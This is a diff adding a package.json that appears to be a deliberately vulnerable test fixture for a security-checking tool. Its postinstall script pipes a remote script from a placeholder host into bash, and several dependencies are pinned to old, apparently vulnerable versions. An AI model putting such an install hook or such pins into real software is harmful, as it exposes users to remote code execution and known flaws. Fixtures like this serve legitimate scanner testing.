@@ -1,0 +1,17 @@
+{
+  "name": "skill-fixture-vulnerable-app",
+  "version": "0.0.1",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -s https://example.invalid/install.sh | bash",
+    "start": "node src/app.js"
+  },
+  "dependencies": {
+    "axios": "0.21.0",
+    "express": "4.17.1",
+    "follow-redirects": "1.13.0",
+    "jsonwebtoken": "8.5.1",
+    "lodash": "4.17.20",
+    "minimist": "0.0.8"
+  }
+}
